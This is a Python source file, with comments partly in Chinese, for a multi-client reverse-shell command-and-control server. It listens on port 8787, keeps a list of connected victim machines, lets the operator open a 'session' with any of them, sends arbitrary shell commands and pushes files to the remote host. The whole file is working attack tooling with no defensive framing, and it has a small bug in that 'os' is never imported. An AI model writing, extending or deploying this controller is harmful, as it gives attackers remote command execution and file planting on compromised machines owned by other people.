import socket
import threading
import time
from queue import Queue
from termcolor import *

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
all_connections = []
all_addresses = []
HOST= '0.0.0.0'
PORT= 8787


class Server:
    def __init__(self,host,port):
        self.host = host
        self.port = port

    #建立socket (允許兩台電腦之間建立會話)
    def socket_create(self):
        try:
            global soc
            soc = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        except socket.error as msg:
            print(colored("SOCKET creation Error:"+str(msg),'red'))

    #將socket綁定到port 中並等待來自客戶端的連接
    def socket_bind(self):
        try:
            print(colored('[*]','green') + "Binding socket to PORT: " + str(PORT))
            soc.bind((self.host, self.port))
            soc.listen(5)
        except socket.error as msg:
            print(colored("SOCKET binding Error:" + str(msg) + "\n"+ "Retrying....",'red'))
            self.socket_bind()

    #刪除所有之前紀錄的列表
    def remove_old_list(self):
        for each_old_conn in all_connections:
            each_old_conn.close()
        del all_connections[:]
        del all_addresses[:]

    # 接收所有客戶端連接請求並將他存入列表中
    def accept_connections(self):
        self.remove_old_list()
        while True:
            try:
                conn, address = soc.accept()
                conn.setblocking(1)
                all_connections.append(conn)
                all_addresses.append(address)
                print("\n"+colored('[*]','green')+"Connection has been established from IP: "+address[0]+'\n'+'terminal> ')
            except:
                print(colored("Error accepting connections",'red'))

    def start_terminal(self):
        while True:
            cmd = input('terminal> ')                 #custom command that was defined by me
            if cmd == "list":
                self.list_connections()
                continue
            if "sessions" in cmd:
                conn = self.get_target(cmd)
                if conn is not None:
                    self.send_target_commands(conn)
            else:
                print(colored("Command not recognized",'red'))

    #列出現有可用連結 list命令
    def list_connections(self):
        results = ""
        for ID,conn in enumerate(all_connections):
            try:
                conn.send(str.encode(" "))
                conn.recv(20480)
            except:
                del all_connections[ID]
                del all_addresses[ID]
                continue
            results += str(ID).center(5," ") + '\t\t' + str(all_addresses[ID][0]).ljust(20," ")+ '\t\t' + str(all_addresses[ID][1]).ljust(5," ") + '\n'
        print('ID'.center(5,'-') +'\t\t' + "IP".center(20,'-') +'\t\t' + 'PORT'.center(5,'-')+"\n"+results)

    #選擇一個可連接的目標並進入會話
    def get_target(self,cmd):
        try:
            target = cmd.replace("sessions ",'')
            target = int(target)
            conn = all_connections[target]
            print(colored('[*]','green')+"You are now connected to " + str(all_addresses[target][0]))
            print(str(all_addresses[target][0])+'> ',end='')
            return conn
        except:
            print(colored("Not a valid selection",'red'))
            return None

    # 傳送命令 並接收回值
    def send_target_commands(self,conn):
        while True:
            try:
                cmd = input()
                if len(str.encode(cmd)) > 0:
                    if cmd.split(' ')[0] == "upload" :
                        if os.path.isfile(cmd.split(' ')[1]):
                            conn.send(bytes('upload','utf-8'))
                            print(str(conn.recv(20480),'utf8'))
                            self.upload_something(cmd,conn)
                        else:
                            print(colored("File isn't exists, please Coreect the filename and path",'red'),'\nterminal> ')
                            continue
                    else:                                             #執行cmd命令
                        conn.send(str.encode(cmd))
                        client_response = str(conn.recv(20480), "utf-8")
                        print(client_response,end='')
                if cmd == 'quit' or cmd =='exit':
                    break
            except Exception as e:
                print(colored("Connection was lost",'red'))
                print(e)
                break
    # 上傳
    def upload_something(self,cmd,conn):
        info = cmd.split(' ',2)
        if len(info) == 2:
            info.append(".")
        if os.path.isfile(info[1]):
            file_size = os.stat(info[1]).st_size
            info.append(str(file_size))
        send_info = " ".join(info)
        print(send_info)
        conn.send(bytes(send_info,'utf-8'))
        already_sent = 0
        with open(info[1], 'rb') as f:
            while already_sent != file_size:
                data = f.read(1024)
                conn.sendall(data)
                already_sent+=len(data)
            else:
                print('upload sucessful')



# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon =True
        t.start()
# Do the next job in the queue(one handles connections,other sends commands)
def work():
    while True:
        ser = Server(HOST,PORT)
        x = queue.get()
        if x == 1:
            ser.socket_create()
            ser.socket_bind()
            ser.accept_connections()
        if x == 2:
            ser.start_terminal()
        queue.task_done()

#Each list item is a new job
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

if __name__ == "__main__":
    create_workers()
    create_jobs()
